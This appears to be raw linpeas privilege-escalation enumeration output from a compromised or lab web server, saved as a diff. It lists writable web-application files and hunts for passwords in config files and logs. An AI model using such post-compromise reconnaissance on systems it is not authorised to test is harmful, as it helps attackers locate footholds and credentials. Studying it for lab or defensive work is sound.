+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/autosave/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/autosave/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/autosave/langs
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/autosave/langs/en.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/bbcode
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/bbcode/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/bbcode/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/contextmenu
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/contextmenu/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/contextmenu/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/directionality
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/directionality/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/directionality/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/emotions
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/emotions/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/emotions/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/emotions/emotions.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/emotions/img
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/emotions/js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/emotions/js/emotions.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/emotions/langs
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/emotions/langs/en_dlg.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/example
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/example/dialog.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/example/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/example/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/example/img
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/example/js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/example/js/dialog.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/example/langs
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/example/langs/en.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/example/langs/en_dlg.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/example_dependency
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/example_dependency/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/example_dependency/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/fullpage
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/fullpage/css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/fullpage/css/fullpage.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/fullpage/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/fullpage/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/fullpage/fullpage.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/fullpage/js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/fullpage/js/fullpage.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/fullpage/langs
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/fullpage/langs/en_dlg.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/fullscreen
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/fullscreen/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/fullscreen/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/fullscreen/fullscreen.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/iespell
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/iespell/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/iespell/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/inlinepopups
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/inlinepopups/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/inlinepopups/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/inlinepopups/skins
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/inlinepopups/skins/clearlooks2
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/inlinepopups/skins/clearlooks2/img
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/inlinepopups/skins/clearlooks2/window.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/inlinepopups/template.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/insertdatetime
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/insertdatetime/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/insertdatetime/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/layer
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/layer/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/layer/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/legacyoutput
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/legacyoutput/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/legacyoutput/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/lists
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/lists/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/lists/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/media
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/media/css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/media/css/media.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/media/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/media/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/media/js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/media/js/embed.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/media/js/media.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/media/langs
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/media/langs/en_dlg.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/media/media.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/media/moxieplayer.swf
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/nonbreaking
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/nonbreaking/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/nonbreaking/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/noneditable
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/noneditable/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/noneditable/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/pagebreak
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/pagebreak/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/pagebreak/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/paste
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/paste/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/paste/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/paste/js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/paste/js/pastetext.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/paste/js/pasteword.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/paste/langs
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/paste/langs/en_dlg.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/paste/pastetext.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/paste/pasteword.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/preview
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/preview/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/preview/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/preview/example.html
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/preview/jscripts
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/preview/jscripts/embed.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/preview/preview.html
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/print
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/print/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/print/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/save
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/save/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/save/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/searchreplace
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/searchreplace/css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/searchreplace/css/searchreplace.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/searchreplace/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/searchreplace/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/searchreplace/js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/searchreplace/js/searchreplace.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/searchreplace/langs
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/searchreplace/langs/en_dlg.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/searchreplace/searchreplace.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/spellchecker
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/spellchecker/css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/spellchecker/css/content.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/spellchecker/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/spellchecker/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/spellchecker/img
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/style
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/style/css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/style/css/props.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/style/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/style/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/style/js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/style/js/props.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/style/langs
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/style/langs/en_dlg.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/style/props.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/tabfocus
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/tabfocus/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/tabfocus/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/cell.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/css/cell.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/css/row.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/css/table.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/js/cell.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/js/merge_cells.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/js/row.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/js/table.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/langs
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/langs/en_dlg.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/merge_cells.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/row.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/table.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/template
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/template/blank.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/template/css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/template/css/template.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/template/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/template/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/template/js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/template/js/template.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/template/langs
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/template/langs/en_dlg.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/template/template.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/visualchars
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/visualchars/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/visualchars/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/wordcount
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/wordcount/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/wordcount/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/abbr.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/acronym.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/attributes.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/cite.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/css/attributes.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/css/popup.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/del.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/editor_plugin.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/editor_plugin_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/ins.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/js/abbr.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/js/acronym.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/js/attributes.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/js/cite.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/js/del.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/js/element_common.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/js/ins.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/langs
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/langs/en_dlg.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/about.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/anchor.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/charmap.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/color_picker.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/editor_template.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/editor_template_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/image.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/img
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/js/about.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/js/anchor.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/js/charmap.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/js/color_picker.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/js/image.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/js/link.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/js/source_editor.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/langs
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/langs/en.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/langs/en_dlg.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/link.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/shortcuts.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/default
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/default/content.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/default/dialog.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/default/img
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/default/ui.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/highcontrast
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/highcontrast/content.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/highcontrast/dialog.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/highcontrast/ui.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/o2k7
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/o2k7/content.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/o2k7/dialog.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/o2k7/img
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/o2k7/ui.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/o2k7/ui_black.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/o2k7/ui_silver.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/source_editor.htm
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/simple
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/simple/editor_template.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/simple/editor_template_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/simple/img
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/simple/langs
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/simple/langs/en.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/simple/skins
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/simple/skins/default
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/simple/skins/default/content.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/simple/skins/default/ui.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/simple/skins/o2k7
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/simple/skins/o2k7/content.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/simple/skins/o2k7/img
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/simple/skins/o2k7/ui.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/tiny_mce.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/tiny_mce_popup.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/tiny_mce_src.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/utils
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/utils/editable_selects.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/utils/form_utils.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/utils/mctabs.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/utils/validate.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tu_checkBoxHelp.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tu_comboBoxHelp.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tu_functions.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tu_main.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/tu_stringHelp.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/uploadify
+/var/www/html/45kra24zxs28v3yd/administrator/js/uploadify/check.php
+/var/www/html/45kra24zxs28v3yd/administrator/js/uploadify/expressInstall.swf
+/var/www/html/45kra24zxs28v3yd/administrator/js/uploadify/jquery.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/uploadify/jquery.uploadify.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/uploadify/swfobject.js
+/var/www/html/45kra24zxs28v3yd/administrator/js/uploadify/uploadify.css
+/var/www/html/45kra24zxs28v3yd/administrator/js/uploadify/uploadify.php
+/var/www/html/45kra24zxs28v3yd/administrator/js/uploadify/uploadify.swf
+/var/www/html/45kra24zxs28v3yd/administrator/media
+/var/www/html/45kra24zxs28v3yd/administrator/media/uploadsFiles
+/var/www/html/45kra24zxs28v3yd/administrator/templates
+/var/www/html/45kra24zxs28v3yd/administrator/templates/default
+/var/www/html/45kra24zxs28v3yd/administrator/templates/default/css
+/var/www/html/45kra24zxs28v3yd/administrator/templates/default/css/alertConfigField.css
+/var/www/html/45kra24zxs28v3yd/administrator/templates/default/css/alertIFrame.css
+/var/www/html/45kra24zxs28v3yd/administrator/templates/default/css/alertImage.css
+/var/www/html/45kra24zxs28v3yd/administrator/templates/default/css/datagrid.css
+/var/www/html/45kra24zxs28v3yd/administrator/templates/default/css/defaultAlert.css
+/var/www/html/45kra24zxs28v3yd/administrator/templates/default/css/dropdown.css
+/var/www/html/45kra24zxs28v3yd/administrator/templates/default/css/form.css
+/var/www/html/45kra24zxs28v3yd/administrator/templates/default/css/images
+/var/www/html/45kra24zxs28v3yd/administrator/templates/default/css/jquery-ui.css
+/var/www/html/45kra24zxs28v3yd/administrator/templates/default/css/template.css
+/var/www/html/45kra24zxs28v3yd/administrator/templates/default/css/tools.css
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/45kra24zxs28v3yd/administrator/templates/default/html/content.php
+/var/www/html/45kra24zxs28v3yd/administrator/templates/default/html/footer.php
+/var/www/html/45kra24zxs28v3yd/administrator/templates/default/html/header.php
+/var/www/html/45kra24zxs28v3yd/administrator/templates/default/html/login.php
+
+[+] Interesting GROUP writable files (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+  Group www-data:
+/dev/mqueue/linpeas.txt
+/var/lib/squirrelmail/data
+/var/spool/squirrelmail/attach
+
+[+] Searching passwords in config PHP files
+
+[+] Finding IPs inside logs (limit 70)
+     72 /var/log/dpkg.log:1.16.04.1
+     15 /var/log/dpkg.log:3.16.04.4
+     14 /var/log/dpkg.log:1.16.04.4
+     12 /var/log/dpkg.log:1.16.04.5
+     11 /var/log/dpkg.log:6.16.04.1
+      9 /var/log/dpkg.log:2.16.04.2
+      9 /var/log/apt/history.log:1.16.04.1
+      8 /var/log/dpkg.log:2.16.04.3
+      6 /var/log/wtmp:192.168.1.147
+      5 /var/log/installer/status:1.16.04.1
+      4 /var/log/installer/status:1.2.3.3
+      2 /var/log/lastlog:192.168.1.147
+      2 /var/log/apt/history.log:1.16.04.4
+      1 /var/log/installer/status:2.21.63.9
+      1 /var/log/apt/history.log:6.16.04.1
+      1 /var/log/apt/history.log:3.16.04.4
+      1 /var/log/apt/history.log:2.16.04.3
+      1 /var/log/apt/history.log:2.16.04.2
+      1 /var/log/apt/history.log:1.16.04.5
+
+[+] Finding passwords inside logs (limit 70)
+/var/log/bootstrap.log: base-passwd depends on libc6 (>= 2.8); however:
+/var/log/bootstrap.log: base-passwd depends on libdebconfclient0 (>= 0.145); however:
+/var/log/bootstrap.log:Preparing to unpack .../base-passwd_3.5.39_amd64.deb ...
+/var/log/bootstrap.log:Preparing to unpack .../passwd_1%3a4.2-3.1ubuntu5_amd64.deb ...
